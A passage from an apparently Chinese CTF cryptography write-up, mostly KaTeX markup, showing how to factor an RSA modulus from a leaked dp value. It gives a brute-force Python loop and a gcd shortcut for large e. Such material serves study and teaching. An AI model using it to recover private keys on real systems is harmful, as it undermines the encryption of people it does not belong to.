aria-hidden="true"><span class="base"><span class="strut" style="height:10.5em;vertical-align:-5em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.5em;"><span style="top:-7.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-6.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span></span></span><span style="top:-0.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">令</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:1.34em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:5em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.5em;"><span style="top:-7.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:-6.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span><span style="top:-0.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord cjk_fallback">为</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">，则该式变成</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span><span style="top:1.34em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:5em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>此时由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>p</mi><mo>&lt;</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">dp&lt;(p-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，因此<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>&gt;</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">e&gt;x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>，所以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>就在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1,e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span>，此时只要遍历<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1,e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span>，并且计算</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>d</mi><mi>p</mi><mo>∗</mo><mi>e</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">(dp*e-1)/x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">/</span><span class="mord mathnormal">x</span></span></span></span></span></p><p>只要最后结果是整数，那么就大概率是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(p-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，这时候继续往下算，如果解密结果不是乱码就基本上是正确的了。脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br>    <span class="hljs-keyword">if</span> (dp*e-<span class="hljs-number">1</span>)%i == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> n%(((dp*e-<span class="hljs-number">1</span>)/i)+<span class="hljs-number">1</span>)==<span class="hljs-number">0</span>:<br>            p=((dp*e-<span class="hljs-number">1</span>)/i)+<span class="hljs-number">1</span><br>            q=n/(((dp*e-<span class="hljs-number">1</span>)/i)+<span class="hljs-number">1</span>)<br>            phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>            d = gmpy2.invert(e,phi)%phi<br></code></pre></td></tr></table></figure><h3 id="e特别大的情况">e特别大的情况</h3><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>特别大的时候遍历都需要花很长的时间，再进行判断以及计算更需要大量时间，可能跑一年都跑不出来。这时候我们换一种分析方式：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>∗</mo><mi>e</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>≡</mo><mi>d</mi><mo>∗</mo><mi>e</mi><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>∗</mo><mi>e</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msup><mn>2</mn><mrow><mi>d</mi><mi>p</mi><mo>∗</mo><mi>e</mi><mo>−</mo><mn>1</mn></mrow></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>k</mi><mo>∗</mo><mi>p</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msup><mn>2</mn><mrow><mi>d</mi><mi>p</mi><mo>∗</mo><mi>e</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mi>p</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mrow><mi>d</mi><mi>p</mi><mo>∗</mo><mi>e</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned} dp*e &amp;\equiv d*e \mod (p-1)\\dp*e &amp;\equiv 1 \mod(p-1)\\2^{dp*e-1} &amp;\equiv 1 \mod p\\k*p&amp;= 2^{dp*e-1}-1 \\p&amp;=gcd(2^{dp*e-1}-1,n)\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:7.6773em;vertical-align:-3.5887em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.0887em;"><span style="top:-6.2487em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span></span></span><span style="top:-4.7487em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span></span></span><span style="top:-3.1896em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">e</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span><span style="top:-1.6304em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">p</span></span></span><span style="top:-0.0713em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.5887em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.0887em;"><span style="top:-6.2487em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-4.7487em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-3.1896em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span><span style="top:-1.6304em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">e</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span><span style="top:-0.0713em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">e</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" 